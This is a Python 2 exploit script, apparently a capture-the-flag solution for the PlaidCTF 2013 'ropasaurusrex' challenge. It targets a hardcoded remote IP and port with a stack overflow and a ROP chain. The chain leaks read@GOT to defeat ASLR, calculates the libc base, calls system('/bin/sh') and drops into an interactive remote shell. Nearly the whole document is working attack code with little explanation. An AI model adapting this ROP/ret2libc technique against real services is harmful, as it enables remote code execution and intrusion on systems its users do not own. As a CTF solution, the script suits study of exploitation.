#!/usr/bin/python
#
# PlaidCTF 2013
# pwnable200 - ropasaurusrex (ASLR/NX)
# danigargu @ w3b0n3s
#

import sys
import time
import socket
from struct import pack,unpack

#host = '127.0.0.1'
host = '54.234.151.114'
port = 1025

p = lambda x : pack("<L", x)   # pack
u = lambda x : unpack("<L", x) # unpack

def get_connection(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	return s

def interact_shell(s):
	while True:
		try:
			sys.stdout.write("$ ")
			sys.stdout.flush()
			c = sys.stdin.readline()
			s.send(c)
			time.sleep(0.5)
			sys.stdout.write(s.recv(4096))
		except KeyboardInterrupt, e:
			print " quit"
			s.close()
			break


padding = 'A'*140
place = 0x08049620     # .data:08049620
write_plt = 0x0804830c # write@PLT
read_plt  = 0x0804832c # read@PLT
read_got  = 0x0804961c # read@GOT
pop3 = 0x80484b6       # pop esi ; pop edi ; pop ebp ; ret
leave = 0x80482ea      # leave ; ret

# write(int fd, const void *buf, size_t count);
write = p(write_plt)   # write()
write += p(pop3)       # RET -> clean args
write += p(1)          # stdout
write += p(read_got)   # read@GOT
write += p(4)          # 4 bytes

# fake EBP
read = p(0x80483c3)    # pop ebp ; ret
read += p(place)       # .data:08049620

# read(int fd, void *buf, size_t count);
read += p(read_plt)    # read()
read += p(leave)       # RET -> leave ; ret
read += p(0)           # stdin
read += p(place)       # place
read += p(24)          # 24 bytes

print "[*] Sending stage-1 (loader)"

s = get_connection(host,port)
s.send(padding + write + read)
resp = s.recv(4) # read@libc

libc = u(resp)[0] - 0xbf110  # offset read() from libc
system = p(libc + 0x39450)   # offset system() from libc

print "[*] Discovered libc base : 0x%.8x" % libc
print "[*] system@libc : 0x%s" % system[::-1].encode('hex')

# system("/bin/sh")
payload = "AAAA"             # for pop ebp (leave)
payload += system            # system()
payload += "BBBB"            # RET
payload += p(place + 4*4)    # "/bin/sh" pointer
payload += "/bin/sh\x00"     # "/bin/sh" string

print "[*] Sending stage-2 (payload)\n"

s.send(payload)
interact_shell(s)
